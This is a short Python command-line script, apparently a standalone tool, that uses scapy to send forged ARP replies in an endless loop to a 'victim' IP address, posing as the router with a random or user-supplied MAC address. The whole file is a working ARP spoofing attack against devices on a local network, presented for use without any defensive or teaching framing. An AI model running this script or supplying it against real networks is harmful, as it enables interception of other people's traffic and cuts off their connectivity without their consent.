#!/usr/bin/env python3
import typer
import scapy.all
import scapy.layers.l2
from typing import Optional
import random
import time
try:
    from cli_colors import colors
except ModuleNotFoundError:
    # This should return "" instead of the color escape code
    colors = type("MockColors",(str,),{"__getattr__":lambda*a:a[0],"__str__":lambda*a:"","__repr__":lambda*a:""})

app = typer.Typer()

@app.command()
def entry_point(victim_ip: str = typer.Argument(..., help="The ip of the victim device"), router_ip: str = typer.Argument(..., help="The ip of the router"), delay: int = typer.Option(5, help="The delay between packets"), mac_addr: Optional[str] = typer.Option("", help="The mac address to send to the victim", show_default="random")):
    # I'll leave checking if the ip is valid
    # as an exercise to the reader
    while True:
        send_arp_response(victim_ip, router_ip, mac_addr)
        time.sleep(delay)

def get_mac_address() -> str:
    octs = [random.randrange(255) for _ in range(6)]
    return ":".join(f"{i:X}" for i in octs)

def send_arp_response(dst_ip: str, src_ip: str, hwsrc: Optional[str]=None) -> None:
    if not hwsrc:
        hwsrc = get_mac_address()
    scapy.all.send(
        scapy.layers.l2.ARP(
            op=2,
            psrc=src_ip,
            pdst=dst_ip,
            hwsrc=hwsrc
        )
    )

if __name__ == "__main__":
    app()
